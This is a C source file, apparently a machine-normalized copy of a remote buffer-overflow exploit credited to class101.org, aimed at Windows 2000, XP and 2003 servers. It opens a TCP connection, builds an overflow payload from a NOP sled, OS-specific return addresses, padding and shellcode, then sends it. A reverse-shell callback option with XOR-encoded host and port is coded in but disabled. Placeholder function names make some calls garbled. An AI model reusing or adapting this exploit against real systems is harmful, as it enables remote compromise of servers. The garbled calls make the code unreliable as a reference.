#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {short sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  short USHORT ;
typedef  int ULONG ;
typedef  int SOCKET ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  EOL ; 
 int /*<<< orphan*/  FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 () ; 
 scalar_t__ FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (int,struct sockaddr*,int) ; 
 char* ebx ; 
 char* ebx2 ; 
 void* FUNC10 (int) ; 
 short FUNC11 (int) ; 
 int FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ ,int,int) ; 
 char pad ; 
 char* pad2 ; 
 char* payload ; 
 int /*<<< orphan*/  FUNC15 (char*,...) ; 
 char* scode ; 
 int FUNC16 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int FUNC17 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC18 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC19 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC20 (char*,int /*<<< orphan*/ ) ; 
 int FUNC21 (char*) ; 
 int /*<<< orphan*/  talk ; 
 int /*<<< orphan*/  FUNC22 (char*) ; 
 int /*<<< orphan*/  FUNC23 () ; 
 int /*<<< orphan*/  wsadata ; 

int FUNC24(int argc,char *argv[])
{
FUNC23();
unsigned long gip;
unsigned short gport;
char *target, *os;
if
(argc>6||argc<3||FUNC7(argv[1])>3||FUNC7(argv[1])<1){FUNC22(argv[0]);return -1;
}
if (argc==5){FUNC22(argv[0]);return -1;}
   if (FUNC21(argv[2])<7){FUNC22(argv[0]);return -1;}
   if (argc==6)
{
       if (FUNC21(argv[4])<7){FUNC22(argv[0]);return -1;}
}
#ifndef WIN32
if (argc==6)
{
  gip=FUNC12(argv[4])^(long)0x93939393;
 gport=FUNC11(FUNC7(argv[5]))^(short)0x9393;
}
#define Sleep  sleep
#define SOCKET  int
#define closesocket(s) close(s)
#else
if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup error\n");return -1;}
if (argc==6)
{
 gip=inet_addr(argv[4])^(ULONG)0x93939393;
 gport=htons(atoi(argv[5]))^(USHORT)0x9393;
}
#endif
int ip=FUNC10(FUNC12(argv[2])), port;
if (argc==4||argc==6){port=FUNC7(argv[3]);} else port=80;
SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
s=FUNC18(AF_INET,SOCK_STREAM,0);
if (s==-1){FUNC15("[+] socket() error\n");return -1;}
if (FUNC7(argv[1]) == 1){target=ebx;os="Win2k SP4 Server English\n[+] Win2k SP4 Pro.   English\n[+]            Win2k SP- -      -";}
if (FUNC7(argv[1]) == 2){target=ebx2;os="WinXP SP2  Pro. English\n[+] WinXP SP1a Pro. English\n[+]            WinXP SP-  -    -";}
if (FUNC7(argv[1]) == 3){target=ebx2;os="Win2003 SP4 Server English\n[+] Win2003 SP- -      -";}
FUNC15("[+] target(s): %s\n",os);
server.sin_family=AF_INET;
server.sin_addr.s_addr=FUNC10(ip);
server.sin_port=FUNC11(port);
if (argc==6){FUNC15("[+] reverse mode disabled for this exploit\n");
FUNC15("[+] get the source at class101.org and update yourself!\n");return -1;}
FUNC9(s,( struct sockaddr *)&server,sizeof(server));
timeout.tv_sec=3;timeout.tv_usec=0;FUNC2(&mask);FUNC1(s,&mask);
switch(FUNC16(s+1,NULL,&mask,NULL,&timeout))
{
 case -1: {FUNC15("[+] select() error\n");closesocket(s);return -1;}
 case 0: {FUNC15("[+] connect() error\n");closesocket(s);return -1;}
 default:
 if(FUNC0(s,&mask))
 {
  FUNC15("[+] connected, constructing the payload...\n");
#ifdef WIN32
  Sleep(1000);
#else
  FUNC0(1);
#endif
  FUNC20(payload,talk);
  FUNC14(payload+29,0x90,520);
  if (FUNC7(argv[1]) == 1||FUNC7(argv[1]) == 2)
  {
   FUNC13(payload+29+492,&pad,4);
   FUNC13(payload+521+4,target,4);
   FUNC13(payload+536+1,pad2,5);
  }
  else
  {
   FUNC13(payload+29+485,&pad,4);
   FUNC13(payload+514+4,target,4);
   FUNC13(payload+529+1,pad2,5);
  }
  FUNC19(payload,EOL);
  FUNC13(payload+36+3,scode,FUNC21(scode));
  if (FUNC17(s,payload,FUNC21(payload),0)==-1) { FUNC15("[+] sending error 1, the server prolly rebooted.\n");return -1;}
#ifdef WIN32
  Sleep(2000);
#else
  FUNC0(2);
#endif

  FUNC15("[+] size of payload: %d\n",FUNC21(payload));
  FUNC15("[+] payload sent.\n");
  return 0;
 }
}
closesocket(s);
#ifdef WIN32
WSACleanup();
#endif
return 0;
}